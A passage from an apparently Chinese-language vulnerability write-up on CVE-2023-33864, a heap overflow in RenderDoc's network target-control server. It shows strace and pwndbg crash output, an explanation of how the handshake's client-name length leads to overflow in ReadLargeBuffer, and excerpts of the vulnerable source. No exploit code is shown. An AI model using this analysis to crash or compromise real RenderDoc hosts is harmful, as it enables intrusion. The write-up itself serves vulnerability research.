2847  fcntl<span class="o">(</span>5, F_GETFL<span class="o">)</span>                 <span class="o">=</span> 0x2 <span class="o">(</span>flags O_RDWR<span class="o">)</span>
2847  fcntl<span class="o">(</span>5, F_SETFL, O_RDWR|O_NONBLOCK<span class="o">)</span> <span class="o">=</span> 0
2847  setsockopt<span class="o">(</span>5, SOL_SOCKET, SO_RCVTIMEO_OLD, <span class="s2">"</span><span class="se">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><span class="s2">"</span>, 16<span class="o">)</span> <span class="o">=</span> 0
2847  recvfrom<span class="o">(</span>5, <span class="s2">"00000000000000000000000000000000"</span>..., 4284546928, 0, NULL, NULL<span class="o">)</span> <span class="o">=</span> 4096
2847  writev<span class="o">(</span>2, <span class="o">[{</span><span class="nv">iov_base</span><span class="o">=</span><span class="s2">"malloc(): corrupted top size"</span>, <span class="nv">iov_len</span><span class="o">=</span>28<span class="o">}</span>, <span class="o">{</span><span class="nv">iov_base</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, <span class="nv">iov_len</span><span class="o">=</span>1<span class="o">}]</span>, 2<span class="o">)</span> <span class="o">=</span> 29
2847  mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="nt">-1</span>, 0<span class="o">)</span> <span class="o">=</span> 0x7f59a2e59000
2847  rt_sigprocmask<span class="o">(</span>SIG_UNBLOCK, <span class="o">[</span>ABRT], NULL, 8<span class="o">)</span> <span class="o">=</span> 0
2847  rt_sigprocmask<span class="o">(</span>SIG_BLOCK, ~[RTMIN RT_1], <span class="o">[]</span>, 8<span class="o">)</span> <span class="o">=</span> 0
2847  getpid<span class="o">()</span>                          <span class="o">=</span> 2846
2847  gettid<span class="o">()</span>                          <span class="o">=</span> 2847
2847  tgkill<span class="o">(</span>2846, 2847, SIGABRT<span class="o">)</span>       <span class="o">=</span> 0
2847  rt_sigprocmask<span class="o">(</span>SIG_SETMASK, <span class="o">[]</span>, NULL, 8<span class="o">)</span> <span class="o">=</span> 0
2847  <span class="nt">---</span> SIGABRT <span class="o">{</span><span class="nv">si_signo</span><span class="o">=</span>SIGABRT, <span class="nv">si_code</span><span class="o">=</span>SI_TKILL, <span class="nv">si_pid</span><span class="o">=</span>2846, <span class="nv">si_uid</span><span class="o">=</span>1000<span class="o">}</span> <span class="nt">---</span>
2846  &lt;... clock_nanosleep resumed&gt; &lt;unfinished ...&gt;<span class="o">)</span> <span class="o">=</span> ?
2847  +++ killed by SIGABRT <span class="o">(</span>core dumped<span class="o">)</span> +++
2846  +++ killed by SIGABRT <span class="o">(</span>core dumped<span class="o">)</span> +++
</code></pre></div></div>

<p>漏洞现场：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pwndbg /usr/bin/sleep          <span class="c"># 先挂在sleep程序上面进行调试</span>
pwndbg&gt; <span class="nb">set </span>environment LD_PRELOAD /test/renderdoc/build/lib/librenderdoc.so <span class="c"># 手动加载库文件                                                                                                                                                                                                        </span>
pwndbg&gt; r 600   
Starting program: /usr/bin/sleep 600                                                                                                                                                                                                                                                
warning: Error disabling address space randomization: Operation not permitted                                                                                                                                                                                                       
warning: could not convert <span class="s1">'rb_root'</span> from the host encoding <span class="o">(</span>UTF-8<span class="o">)</span> to UTF-32.                                                                                                                                                                                                      
This normally should not happen, please file a bug report.                                                                                                                                                                                                                          
<span class="o">[</span>Thread debugging using libthread_db enabled]                                                                                                                                                                                                                                       
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>                                                                                                                                                                                                          
<span class="o">[</span>New Thread 0x7f49e7890700 <span class="o">(</span>LWP 2932<span class="o">)]</span>      <span class="c"># librenderdoc.so起了tcp进程                                                                                                                                                                                                                                        </span>
malloc<span class="o">()</span>: corrupted top size 
Thread 2 <span class="s2">"TargetControlSe"</span> received signal SIGABRT, Aborted.                                                                                                                                                                                                                        
<span class="o">[</span>Switching to Thread 0x7f49e7890700 <span class="o">(</span>LWP 2932<span class="o">)]</span>                                                                                                                                                                                                                                     
__GI_raise <span class="o">(</span><span class="nv">sig</span><span class="o">=</span>sig@entry<span class="o">=</span>6<span class="o">)</span> at ../sysdeps/unix/sysv/linux/raise.c:50                                                                                                                                                                                                               
warning: 50     ../sysdeps/unix/sysv/linux/raise.c: No such file or directory                                                                                                                                                                                                       
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                                                                                                                                                                                    
_______________________________________________________________________________________________________________[ REGISTERS / show-flags off / show-compact-regs off <span class="o">]</span>_______________________________________________________________________________________________________________
 RAX  0
 RBX  0x7f49e7890700 __ 0x7f49e7890700
 RCX  0x7f49e7de500b <span class="o">(</span>raise+203<span class="o">)</span> __ mov rax, qword ptr <span class="o">[</span>rsp + 0x108]
 RDX  0
 RDI  2
 RSI  0x7f49e788f450 __ 0
 R8   0
 R9   0x7f49e788f450 __ 0
 R10  8
 R11  0x246
 R12  0x7f49ed0a2000 __ 0x6c6c616d00001000
 R13  0x7f49e788f6c0 __ 0x7f49e788f6d0 __ 0x7f49e7f5929a __ 0x203a646d6372000a /<span class="k">*</span> <span class="s1">'\n'</span> <span class="k">*</span>/
 R14  0x1000
 R15  1
 RBP  0x7f49e788f7a0 __ 0x1c
 RSP  0x7f49e788f450 __ 0
 RIP  0x7f49e7de500b <span class="o">(</span>raise+203<span class="o">)</span> __ mov rax, qword ptr <span class="o">[</span>rsp + 0x108]
________________________________________________________________________________________________________________________[ DISASM / x86-64 / <span class="nb">set </span>emulate on <span class="o">]</span>________________________________________________________________________________________________________________________
 _ 0x7f49e7de500b &lt;raise+203&gt;    mov    rax, qword ptr <span class="o">[</span>rsp + 0x108]     RAX, <span class="o">[</span>0x7f49e788f558] <span class="o">=&gt;</span> 0x3a9e059a88559600
   0x7f49e7de5013 &lt;raise+211&gt;    xor    rax, qword ptr fs:[0x28]         RAX <span class="o">=&gt;</span> 0 <span class="o">(</span>0x3a9e059a88559600 ^ 0x3a9e059a88559600<span class="o">)</span>
   0x7f49e7de501c &lt;raise+220&gt;    jne    raise+260                   &lt;raise+260&gt;
  
   0x7f49e7de501e &lt;raise+222&gt;    mov    eax, r8d       EAX <span class="o">=&gt;</span> 0
   0x7f49e7de5021 &lt;raise+225&gt;    add    rsp, 0x118     RSP <span class="o">=&gt;</span> 0x7f49e788f568 <span class="o">(</span>0x7f49e788f450 + 0x118<span class="o">)</span>
   0x7f49e7de5028 &lt;raise+232&gt;    ret                                &lt;abort+299&gt;
    _
   0x7f49e7dc4859 &lt;abort+299&gt;    mov    rbx, qword ptr fs:[0x10]            RBX, <span class="o">[</span>0x7f49e7890710] <span class="o">=&gt;</span> 0x7f49e7890700 __ 0x7f49e7890700
   0x7f49e7dc4862 &lt;abort+308&gt;    cmp    qword ptr <span class="o">[</span>rip + 0x1cb3ef], rbx     0x0 - 0x7f49e7890700     EFLAGS <span class="o">=&gt;</span> 0x287 <span class="o">[</span> CF PF af zf SF IF <span class="nb">df </span>of <span class="o">]</span>
   0x7f49e7dc4869 &lt;abort+315&gt;    je     abort+379                   &lt;abort+379&gt;
  
   0x7f49e7dc486b &lt;abort+317&gt;    mov    eax, dword ptr fs:[0x18]            EAX, <span class="o">[</span>0x7f49e7890718] <span class="o">=&gt;</span> 1
   0x7f49e7dc4873 &lt;abort+325&gt;    <span class="nb">test   </span>eax, eax                            1 &amp; 1     EFLAGS <span class="o">=&gt;</span> 0x202 <span class="o">[</span> cf pf af zf sf IF <span class="nb">df </span>of <span class="o">]</span>
_____________________________________________________________________________________________________________________________________[ STACK <span class="o">]</span>______________________________________________________________________________________________________________________________________
00:0000_ rsi r9 rsp 0x7f49e788f450 __ 0
... _               7 skipped
___________________________________________________________________________________________________________________________________[ BACKTRACE <span class="o">]</span>____________________________________________________________________________________________________________________________________
 _ 0   0x7f49e7de500b raise+203
   1   0x7f49e7dc4859 abort+299
   2   0x7f49e7e2f266 __libc_message+662
   3   0x7f49e7e372fc None
   4   0x7f49e7e3a6ba _int_malloc+3146
   5   0x7f49e7e3c299 malloc+441
   6   0x7f49e7ad3b29 operator new<span class="o">(</span>unsigned long<span class="o">)</span>+25
   7   0x7f49e968d3ba StringFormat::sntimef<span class="o">(</span>long, char const<span class="k">*</span><span class="o">)</span>+133
_______________________________________________________________________________________________________________________________[ THREADS <span class="o">(</span>2 TOTAL<span class="o">)</span> <span class="o">]</span>________________________________________________________________________________________________________________________________
  _ 2   <span class="s2">"TargetControlSe"</span> stopped: 0x7f49e7de500b &lt;raise+203&gt; 
    1   <span class="s2">"sleep"</span>           stopped: 0x7f49e7e7f23f &lt;clock_nanosleep+223&gt; 
____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
pwndbg&gt; bt
<span class="c">#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50</span>
<span class="c">#1  0x00007f49e7dc4859 in __GI_abort () at abort.c:79</span>
<span class="c">#2  0x00007f49e7e2f266 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7f49e7f59298 "%s\n") at ../sysdeps/posix/libc_fatal.c:156</span>
<span class="c">#3  0x00007f49e7e372fc in malloc_printerr (str=str@entry=0x7f49e7f57569 "malloc(): corrupted top size") at malloc.c:5347</span>
<span class="c">#4  0x00007f49e7e3a6ba in _int_malloc (av=av@entry=0x7f49e0000020, bytes=bytes@entry=28) at malloc.c:4107</span>
<span class="c">#5  0x00007f49e7e3c299 in __GI___libc_malloc (bytes=28) at malloc.c:3066</span>
<span class="c">#6  0x00007f49e7ad3b29 in operator new(unsigned long) () from /lib/x86_64-linux-gnu/libstdc++.so.6</span>
<span class="c">#7  0x00007f49e968d3ba in StringFormat::sntimef (utcTime=1747123722, format=0x7f49e993c364 "[%H:%M:%S] ") at /test/renderdoc/renderdoc/os/posix/posix_stringio.cpp:610                                                </span>
<span class="c">#8  0x00007f49e902535d in rdclog_direct (utcTime=1747123722, pid=2928, type=LogType::Comment, project=0x7f49e99486bf "RDOC", file=0x7f49e9948940 "/test/renderdoc/renderdoc/core/target_control.cpp", line=489, fmt=0x7f49e9948ae8 "Invalid/Unsupported handshake '%s' / %d")</span>
    at /test/renderdoc/renderdoc/common/common.cpp:391
<span class="c">#9  0x00007f49e9143228 in RenderDoc::TargetControlServerThread (sock=0x56319210be70) at /test/renderdoc/renderdoc/core/target_control.cpp:489</span>
<span class="c">#10 0x00007f49e9045ed1 in &lt;lambda()&gt;::operator()(void) const (__closure=0x7f49e788feb0) at /test/renderdoc/renderdoc/core/core.cpp:456</span>
<span class="c">#11 0x00007f49e905081c in std::_Function_handler&lt;void(), RenderDoc::Initialise()::&lt;lambda()&gt; &gt;::_M_invoke(const std::_Any_data &amp;) (__functor=...) at /usr/include/c++/9/bits/std_function.h:300</span>
<span class="c">#12 0x00007f49e851ceec in std::function&lt;void()&gt;::operator() (this=0x7f49e788feb0) at /usr/include/c++/9/bits/std_function.h:688</span>
<span class="c">#13 0x00007f49e968da8d in Threading::sThreadInit (init=0x56319210bf40) at /test/renderdoc/renderdoc/os/posix/posix_threading.cpp:173</span>
<span class="c">#14 0x00007f49e7c13609 in start_thread (arg=&lt;optimized out&gt;) at pthread_create.c:477</span>
<span class="c">#15 0x00007f49e7ec1353 in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95</span>
</code></pre></div></div>

<p>栈回溯信息：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-13_161522.png" alt="批注 2025-05-13 161522.png" /></p>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="漏洞原理">漏洞原理</h2>

<p>librenderdoc.so 初始化过程中会起一个 TCP 服务线程作为server，线程主体是TargetControlServerThread函数。该函数内部是一个 while 循环，每隔5秒钟检查一次是否有客户端连接到38920端口。</p>

<p>server 实例化一个 StreamReader 对象 ser 用于和 client 交互。ser对象里面封装了 client 的网络句柄、接收缓冲区、读写指针等。</p>

<p>从数据包解析 版本号、clientname、是否杀死已有的调试线程这3个信息。</p>

<p>成功解析以上3个信息之后，若当前 server 端没有调试线程，那么为 client 起一个新的调试线程；</p>

<p>若当前 server 端已经存在了调试线程，若 kick = true，为当前的 client 起一个新线程来代替旧线程。</p>

<p>若当前 server 端已经存在了调试线程，若 kick = false，那么继续保留旧线程，并且把就线程的名称返回给 client，告知 client 已有线程存在。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">RenderDoc</span><span class="o">::</span><span class="n">TargetControlServerThread</span><span class="p">(</span><span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">SetCurrentThreadName</span><span class="p">(</span><span class="s">"TargetControlServerThread"</span><span class="p">);</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">KeepModuleAlive</span><span class="p">();</span>
  <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">ThreadHandle</span> <span class="n">clientThread</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
  <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_TargetControlThreadShutdown</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">client</span> <span class="o">=</span> <span class="n">sock</span><span class="o">-&gt;</span><span class="n">AcceptClient</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">client</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">Connected</span><span class="p">())</span>
      <span class="p">{</span>
        <span class="n">RDCERR</span><span class="p">(</span><span class="s">"Error in accept - shutting down server"</span><span class="p">);</span>

        <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">Threading</span><span class="o">::</span><span class="n">ReleaseModuleExitThread</span><span class="p">();</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="n">Threading</span><span class="o">::</span><span class="n">Sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">rdcstr</span> <span class="n">existingClient</span><span class="p">;</span>
    <span class="n">rdcstr</span> <span class="n">newClient</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">version</span><span class="p">;</span>
    <span class="kt">bool</span> <span class="n">kick</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

    <span class="c1">// receive handshake from client and get its name</span>
    <span class="p">{</span>
      <span class="n">ReadSerialiser</span> <span class="n">ser</span><span class="p">(</span><span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Nothing</span><span class="p">),</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Stream</span><span class="p">);</span>
      <span class="n">PacketType</span> <span class="n">type</span> <span class="o">=</span> <span class="n">ser</span><span class="p">.</span><span class="n">ReadChunk</span><span class="o">&lt;</span><span class="n">PacketType</span><span class="o">&gt;</span><span class="p">();</span>

      <span class="k">if</span><span class="p">(</span><span class="n">type</span> <span class="o">!=</span> <span class="n">ePacket_Handshake</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">version</span><span class="p">);</span>
      <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">newClient</span><span class="p">);</span>
      <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">kick</span><span class="p">);</span>

      <span class="n">ser</span><span class="p">.</span><span class="n">EndChunk</span><span class="p">();</span>

      <span class="k">if</span><span class="p">(</span><span class="n">newClient</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">IsProtocolVersionSupported</span><span class="p">(</span><span class="n">version</span><span class="p">))</span>
      <span class="p">{</span>
        <span class="n">RDCLOG</span><span class="p">(</span><span class="s">"Invalid/Unsupported handshake '%s' / %d"</span><span class="p">,</span> <span class="n">newClient</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">version</span><span class="p">);</span>
        <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// see if we have a client</span>
    <span class="p">{</span>
      <span class="n">SCOPED_LOCK</span><span class="p">(</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientLock</span><span class="p">);</span>
      <span class="n">existingClient</span> <span class="o">=</span> <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">existingClient</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">kick</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// forcibly close communication thread which will kill the connection</span>
      <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
      <span class="n">Threading</span><span class="o">::</span><span class="n">JoinThread</span><span class="p">(</span><span class="n">clientThread</span><span class="p">);</span>
      <span class="n">Threading</span><span class="o">::</span><span class="n">CloseThread</span><span class="p">(</span><span class="n">clientThread</span><span class="p">);</span>
      <span class="n">clientThread</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
      <span class="n">existingClient</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">existingClient</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span>
    <span class="p">{</span>
      <span class="n">SCOPED_LOCK</span><span class="p">(</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientLock</span><span class="p">);</span>
      <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span> <span class="o">=</span> <span class="n">newClient</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// if we've claimed client status, spawn a thread to communicate</span>
    <span class="k">if</span><span class="p">(</span><span class="n">existingClient</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">||</span> <span class="n">kick</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">clientThread</span> <span class="o">=</span>
          <span class="n">Threading</span><span class="o">::</span><span class="n">CreateThread</span><span class="p">([</span><span class="n">version</span><span class="p">,</span> <span class="n">client</span><span class="p">]</span> <span class="p">{</span> <span class="n">TargetControlClientThread</span><span class="p">(</span><span class="n">version</span><span class="p">,</span> <span class="n">client</span><span class="p">);</span> <span class="p">});</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="c1">// if we've been asked to kick the existing connection off</span>
      <span class="c1">// reject this connection and tell them who is busy</span>
      <span class="n">WriteSerialiser</span> <span class="n">ser</span><span class="p">(</span><span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Nothing</span><span class="p">),</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Stream</span><span class="p">);</span>

      <span class="n">ser</span><span class="p">.</span><span class="n">SetStreamingMode</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>

      <span class="n">rdcstr</span> <span class="n">target</span> <span class="o">=</span> <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">GetCurrentTarget</span><span class="p">();</span>
      <span class="p">{</span>
        <span class="n">SCOPED_SERIALISE_CHUNK</span><span class="p">(</span><span class="n">ePacket_Busy</span><span class="p">);</span>
        <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">TargetControlProtocolVersion</span><span class="p">);</span>
        <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
        <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="c1">// don't care about errors, we're going to close the connection either way</span>
      <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
  <span class="c1">// don't join, just close the thread, as we can't wait while in the middle of module unloading</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">CloseThread</span><span class="p">(</span><span class="n">clientThread</span><span class="p">);</span>
  <span class="n">clientThread</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">ReleaseModuleExitThread</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>client向server请求建立调试的过程中，client首先向server发送握手包表明自身身份，其中包含了请求标识“client name”，server在处理“client name”的时候，首先实例化一个 StreamReader 对象用于网络通信，该对象内部有一个64KB的堆缓冲区m_BufferBase 用于暂存网络数据，m_InputSize 指示已经读取的字节数，m_BufferHead 指示下一次写入的位置，m_BufferSize 指示缓冲区的大小为64KB。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// streamio.cpp</span>

<span class="mi">42</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">initialBufferSize</span> <span class="o">=</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
 <span class="p">..</span>
 <span class="mi">92</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">StreamReader</span><span class="p">(</span><span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">,</span> <span class="n">Ownership</span> <span class="n">own</span><span class="p">)</span>
 <span class="mi">93</span> <span class="p">{</span>
 <span class="mi">94</span>   <span class="n">m_Sock</span> <span class="o">=</span> <span class="n">sock</span><span class="p">;</span>
 <span class="mi">95</span>
 <span class="mi">96</span>   <span class="n">m_BufferSize</span> <span class="o">=</span> <span class="n">initialBufferSize</span><span class="p">;</span>
 <span class="mi">97</span>   <span class="n">m_BufferBase</span> <span class="o">=</span> <span class="n">AllocAlignedBuffer</span><span class="p">(</span><span class="n">m_BufferSize</span><span class="p">);</span>
 <span class="mi">98</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span><span class="p">;</span>
 <span class="mi">99</span>
<span class="mi">100</span>   <span class="c1">// for sockets we use m_InputSize to indicate how much data has been read into the buffer.</span>
<span class="mi">101</span>   <span class="n">m_InputSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>SerialiseValue 函数用于解析握手包的字段，读取长度字段解析出 “client name”字符串的长度，调用resize函数分配 string buffer， 保存“client name”所需的堆块，然后从网络读取 “client name” 并保存。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// D:\sourceinsight工程\renderdoc\renderdoc\renderdoc\serialise\serialiser.h</span>

<span class="mi">1307</span>   <span class="kt">void</span> <span class="n">SerialiseValue</span><span class="p">(</span><span class="n">SDBasic</span> <span class="n">type</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">byteSize</span><span class="p">,</span> <span class="n">rdcstr</span> <span class="o">&amp;</span><span class="n">el</span><span class="p">)</span>
<span class="mi">1308</span>   <span class="p">{</span>
<span class="mi">1309</span>     <span class="kt">uint32_t</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="mi">1310</span>
<span class="mi">1311</span>     <span class="k">if</span><span class="p">(</span><span class="n">IsReading</span><span class="p">())</span>
<span class="mi">1312</span>     <span class="p">{</span>
<span class="mi">1313</span>       <span class="n">m_Read</span><span class="o">-&gt;</span><span class="n">Read</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
<span class="mi">1314</span>       <span class="n">el</span><span class="p">.</span><span class="n">resize</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">len</span><span class="p">);</span>
<span class="mi">1315</span>       <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
<span class="mi">1316</span>         <span class="n">m_Read</span><span class="o">-&gt;</span><span class="n">Read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">el</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">len</span><span class="p">);</span>
</code></pre></div></div>

<p>若读取的数据长度超过10MB，那么进入ReadLargeBuffer函数，ReadLargeBuffer把数据直接拷贝进入string buffer。</p>

<p>若小于10MB，那么先从网络读取数据到m_BufferBase，再从m_BufferBase拷贝数据到string buffer。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">139</span>   <span class="n">bool</span> <span class="nf">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">)</span>
<span class="mi">140</span>   <span class="p">{</span>
<span class="p">...</span>
<span class="mi">183</span>         <span class="k">if</span><span class="p">(</span><span class="n">numBytes</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">&amp;&amp;</span> <span class="n">Available</span><span class="p">()</span> <span class="o">+</span> <span class="mi">128</span> <span class="o">&lt;</span> <span class="n">numBytes</span><span class="p">)</span>
<span class="mi">184</span>         <span class="p">{</span>
<span class="mi">185</span>           <span class="n">success</span> <span class="o">=</span> <span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">numBytes</span><span class="p">);</span>
</code></pre></div></div>

<p>若是读取大于10MB的数据，除了末尾的 128 字节，之前的部分被直接通过 socket 读取进入 string buffer，这个过程在函数 ReadFromExternal 里面。</p>

<p>末尾的128字节先通过 socket 读取到 m_BufferBase 里面，再从 m_BufferBase 拷贝到 string buffer。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">271</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">272</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">275</span>   <span class="n">byte</span> <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">297</span>     <span class="kt">uint64_t</span> <span class="n">directReadLength</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">128</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">304</span>       <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">directReadLength</span><span class="p">);</span>
<span class="mi">305</span>
<span class="mi">306</span>       <span class="n">dest</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">350</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span> <span class="o">+</span> <span class="n">m_BufferSize</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">354</span>   <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
<span class="p">...</span>
